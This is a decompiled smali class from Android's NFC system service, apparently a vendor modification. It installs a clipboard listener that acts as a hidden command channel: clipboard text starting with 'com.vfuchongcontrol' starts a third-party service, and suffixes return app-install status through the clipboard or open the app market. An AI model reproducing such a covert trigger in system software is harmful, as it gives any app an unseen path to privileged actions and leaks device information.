.class Lcom/android/nfc/NfcService$1;
.super Ljava/lang/Object;
.source "NfcService.java"

# interfaces
.implements Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/nfc/NfcService;-><init>(Landroid/app/Application;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/nfc/NfcService;

.field final synthetic val$nfcApplication:Landroid/app/Application;


# direct methods
.method constructor <init>(Lcom/android/nfc/NfcService;Landroid/app/Application;)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/nfc/NfcService;

    .line 838
    iput-object p1, p0, Lcom/android/nfc/NfcService$1;->this$0:Lcom/android/nfc/NfcService;

    iput-object p2, p0, Lcom/android/nfc/NfcService$1;->val$nfcApplication:Landroid/app/Application;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPrimaryClipChanged()V
    .locals 8

    .line 841
    iget-object v0, p0, Lcom/android/nfc/NfcService$1;->this$0:Lcom/android/nfc/NfcService;

    invoke-static {v0}, Lcom/android/nfc/NfcService;->access$000(Lcom/android/nfc/NfcService;)Landroid/content/ClipboardManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v0

    .line 842
    .local v0, "mClip":Landroid/content/ClipData;
    iget-object v1, p0, Lcom/android/nfc/NfcService$1;->this$0:Lcom/android/nfc/NfcService;

    invoke-static {v1}, Lcom/android/nfc/NfcService;->access$000(Lcom/android/nfc/NfcService;)Landroid/content/ClipboardManager;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/ClipboardManager;->hasPrimaryClip()Z

    move-result v1

    if-eqz v1, :cond_4

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/content/ClipData;->getItemCount()I

    move-result v1

    if-lez v1, :cond_4

    .line 843
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    move-result-object v1

    .line 844
    .local v1, "mItem":Landroid/content/ClipData$Item;
    if-nez v1, :cond_0

    return-void

    .line 845
    :cond_0
    invoke-virtual {v1}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    .line 846
    .local v2, "clipBoard":Ljava/lang/CharSequence;
    if-nez v2, :cond_1

    return-void

    .line 847
    :cond_1
    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "com.vfuchongcontrol"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 848
    new-instance v3, Landroid/content/Intent;

    invoke-direct {v3}, Landroid/content/Intent;-><init>()V

    .line 849
    .local v3, "intent":Landroid/content/Intent;
    invoke-virtual {v3, v4}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 850
    const-string v5, "com.vfuchongcontrol.service.InitService"

    invoke-virtual {v3, v4, v5}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 851
    new-instance v6, Landroid/content/ComponentName;

    invoke-direct {v6, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3, v6}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 852
    iget-object v5, p0, Lcom/android/nfc/NfcService$1;->val$nfcApplication:Landroid/app/Application;

    invoke-virtual {v5, v3}, Landroid/app/Application;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 854
    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v6, "isinstall"

    invoke-virtual {v5, v6}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 855
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/CharSequence;)V

    .line 856
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    iget-object v6, p0, Lcom/android/nfc/NfcService$1;->this$0:Lcom/android/nfc/NfcService;

    iget-object v7, p0, Lcom/android/nfc/NfcService$1;->val$nfcApplication:Landroid/app/Application;

    invoke-virtual {v6, v7, v4}, Lcom/android/nfc/NfcService;->isAppInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_2

    .line 857
    const-string v4, "true"

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 859
    :cond_2
    const-string v4, "false"

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 861
    :goto_0
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v6, "Data To Wechat"

    invoke-static {v6, v4}, Landroid/content/ClipData;->newPlainText(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/ClipData;

    move-result-object v4

    .line 862
    .local v4, "clipData":Landroid/content/ClipData;
    iget-object v6, p0, Lcom/android/nfc/NfcService$1;->this$0:Lcom/android/nfc/NfcService;

    invoke-static {v6}, Lcom/android/nfc/NfcService;->access$000(Lcom/android/nfc/NfcService;)Landroid/content/ClipboardManager;

    move-result-object v6

    invoke-virtual {v6, v4}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    .end local v4    # "clipData":Landroid/content/ClipData;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    goto :goto_1

    .line 863
    :cond_3
    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v6, "update"

    invoke-virtual {v5, v6}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_4

    .line 865
    iget-object v5, p0, Lcom/android/nfc/NfcService$1;->val$nfcApplication:Landroid/app/Application;

    invoke-static {v5, v4}, Lcom/android/nfc/NfcService;->jumpToMarket(Landroid/content/Context;Ljava/lang/String;)V

    .line 866
    const-string v4, "Data To Market"

    const-string v5, ""

    invoke-static {v4, v5}, Landroid/content/ClipData;->newPlainText(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/ClipData;

    move-result-object v4

    .line 867
    .restart local v4    # "clipData":Landroid/content/ClipData;
    iget-object v5, p0, Lcom/android/nfc/NfcService$1;->this$0:Lcom/android/nfc/NfcService;

    invoke-static {v5}, Lcom/android/nfc/NfcService;->access$000(Lcom/android/nfc/NfcService;)Landroid/content/ClipboardManager;

    move-result-object v5

    invoke-virtual {v5, v4}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    nop

    .line 871
    .end local v1    # "mItem":Landroid/content/ClipData$Item;
    .end local v2    # "clipBoard":Ljava/lang/CharSequence;
    .end local v3    # "intent":Landroid/content/Intent;
    .end local v4    # "clipData":Landroid/content/ClipData;
    :cond_4
    :goto_1
    return-void
.end method
